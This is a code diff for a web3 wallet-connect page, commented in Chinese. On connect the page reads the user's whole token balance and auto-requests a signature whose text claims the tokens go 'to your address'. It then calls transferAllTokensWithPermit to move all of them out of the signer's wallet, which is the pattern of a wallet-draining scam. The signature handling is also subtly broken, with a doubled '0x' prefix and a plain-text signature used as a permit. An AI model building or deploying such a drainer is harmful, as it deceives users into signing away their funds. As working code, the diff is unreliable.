@@ -1,11 +1,9 @@
-const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30'; // 合约地址
-const contractABI = [
-    // 在这里插入你提供的合约 ABI
-    {
-        "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    },
+let web3;
+let userAddress;
+
+// 替换为你的智能合约 ABI
+const yourContractABI = [
+    // 在这里填入你的合约 ABI
     {
         "inputs": [
             {
@@ -104,10 +102,11 @@ const contractABI = [
     }
 ];
 
-let web3;
-let userAddress;
+// 合约地址
+const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30';
 
 async function connectWallet() {
+    console.log("尝试连接钱包");
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -119,14 +118,13 @@ async function connectWallet() {
         document.getElementById('walletInfo').classList.remove('hidden');
         document.getElementById('connectWallet').classList.add('hidden');
 
-        // 自动填写参数
-        const tokenAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30'; // 替换为你的代币合约地址
-        document.getElementById('tokenAddress').value = tokenAddress; // 代币合约地址
-        document.getElementById('fromAddress').value = userAddress; // 被签名的钱包地址
-        
+        // 自动填写被签名的钱包地址
+        document.getElementById('fromAddress').value = userAddress;
+
         // 查询余额并填写
+        const tokenAddress = document.getElementById('tokenAddress').value;
         const balance = await getTokenBalance(tokenAddress, userAddress);
-        document.getElementById('amount').innerText = balance; // 显示余额
+        document.getElementById('amount').innerText = balance;
 
         // 自动签名并填写 v, r, s
         const signature = await signMessage(tokenAddress, userAddress, balance);
@@ -139,68 +137,45 @@ async function connectWallet() {
     }
 }
 
-async function signAndTransferTokens() {
-    const tokenAddress = document.getElementById('tokenAddress').value;
-    const fromAddress = document.getElementById('fromAddress').value;
-
-    const amount = await getTokenBalance(tokenAddress, fromAddress); // 查询代币余额
-
-    // 生成签名消息
-    const message = web3.utils.soliditySha3(
-        { t: 'address', v: tokenAddress },
-        { t: 'address', v: fromAddress },
-        { t: 'uint256', v: amount }
-    );
-
-    // 进行签名
-    const signature = await web3.eth.sign(message, fromAddress);
-    const { v, r, s } = extractSignatureParameters(signature);
-
-    const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-    try {
-        await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
-        document.getElementById('message').innerText = '代币转移成功！';
-        document.getElementById('message').classList.remove('hidden');
-    } catch (error) {
-        console.error(error);
-        document.getElementById('message').innerText = '代币转移失败！';
-        document.getElementById('message').classList.remove('hidden');
-    }
-}
-
-function extractSignatureParameters(signature) {
-    const r = signature.slice(0, 66);
-    const s = '0x' + signature.slice(66, 130);
-    const v = parseInt(signature.slice(130, 132), 16) + 27; // v 值转换
-    return { v, r, s };
-}
-
-async function getTokenBalance(tokenAddress, fromAddress) {
+async function getTokenBalance(tokenAddress, account) {
     const tokenContract = new web3.eth.Contract([
         {
             "constant": true,
-            "inputs": [
-                {
-                    "name": "owner",
-                    "type": "address"
-                }
-            ],
+            "inputs": [{ "name": "owner", "type": "address" }],
             "name": "balanceOf",
-            "outputs": [
-                {
-                    "name": "",
-                    "type": "uint256"
-                }
-            ],
+            "outputs": [{ "name": "", "type": "uint256" }],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
         }
     ], tokenAddress);
-
-    return await tokenContract.methods.balanceOf(fromAddress).call();
+    const balance = await tokenContract.methods.balanceOf(account).call();
+    return balance;
 }
 
-document.getElementById('connectWallet').addEventListener('click', connectWallet);
-document.getElementById('transferTokens').addEventListener('click', signAndTransferTokens);
+async function signMessage(tokenAddress, fromAddress, amount) {
+    const message = `转移 ${amount} 代币至你的地址。`; // 自定义签名消息
+    const signature = await web3.eth.personal.sign(message, fromAddress);
+    return signature;
+}
+
+function extractSignatureParameters(signature) {
+    const v = parseInt(signature.slice(-2), 16); // 最后两位
+    const r = '0x' + signature.slice(0, 66); // 前66位
+    const s = '0x' + signature.slice(66, 130); // 中间64位
+    return { v, r, s };
+}
+
+async function transferTokens() {
+    const tokenAddress = document.getElementById('tokenAddress').value;
+    const fromAddress = document.getElementById('fromAddress').value;
+    const v = document.getElementById('v').value;
+    const r = document.getElementById('r').value;
+    const s = document.getElementById('s').value;
+
+    // 调用合约进行转账
+    const contract = new web3.eth.Contract(yourContractABI, contractAddress); // 合约地址
+    await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
+
+    alert("代币已成功转移！");
+}
